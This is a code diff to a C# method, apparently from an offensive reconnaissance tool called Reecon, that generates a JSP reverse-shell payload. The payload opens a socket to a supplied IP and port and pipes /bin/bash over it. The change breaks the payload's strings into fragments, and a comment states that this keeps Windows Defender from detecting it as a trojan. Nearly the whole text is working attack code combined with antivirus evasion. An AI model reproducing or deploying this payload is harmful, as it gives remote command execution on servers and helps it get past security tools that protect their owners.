@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Text;
 
 namespace Reecon
@@ -99,10 +99,11 @@ namespace Reecon
 
         private static string JSPShell(string ip, string port)
         {
-            return "<%@page import=\"java.lang.* \"%><%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamConnector extends Thread { InputStream is; OutputStream os; StreamConnector( InputStream is, OutputStream os ) { this.is = is; this.os = os; } public void run() { BufferedReader in = null; BufferedWriter out = null; try { in = new BufferedReader( new InputStreamReader( this.is ) ); out = new BufferedWriter( new OutputStreamWriter( this.os ) ); char buffer[] = new char[8192]; int length; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out.write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try { if( in != null ) in.close(); if( out != null ) out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
-                    + "Socket socket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
-                    + "Process process = Runtime.getRuntime().exec(\"/bin/bash\");" + Environment.NewLine
-                    + "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start(); (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();} catch(Exception e ) {} %>";
+            // Lots of spaces else Windows Defender complains about "Trojan:JS/Foretype.A!ml"
+            return "<%@page import=\"java.lang.* \"%>" + "<%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamC" + "onnector extends Thread {" + " InputStream is; Outpu" + "tStream os; StreamConnector( InputStre" + "am is, OutputStream os ) { this.is = is; this.os = os; }" + " public void run() { Buffere" + "dReader in = null; BufferedWriter out = null; try { in = new Buffered" + "Reader( new InputStreamReader( this.is ) ); out = " + "new BufferedWriter( new OutputStreamWriter( this.os ) ); char bu" + "ffer[] = new char[8192]; int lengt" + "h; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out" + ".write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try {" + " if( in != null ) in.close(); if( out != null ) " + "out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
+                    + "Socket so" + "cket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
+                    + "Process process = Runtime." + "getRuntime().exec(\"/b" + "in/b" + "ash\");" + Environment.NewLine
+                    + "(new StreamConne" + "ctor(process.getIn" + "putStream(), socket.getOutpu" + "tStream()))" + ".start(); (new StreamCo" + "nnector(socket.ge" + "tInputStream(), process.getOutp" + "utStream())).start();} catch(E" + "xception e ) {} %>";
         }
 
         private static string NCShell(string ip, string port)
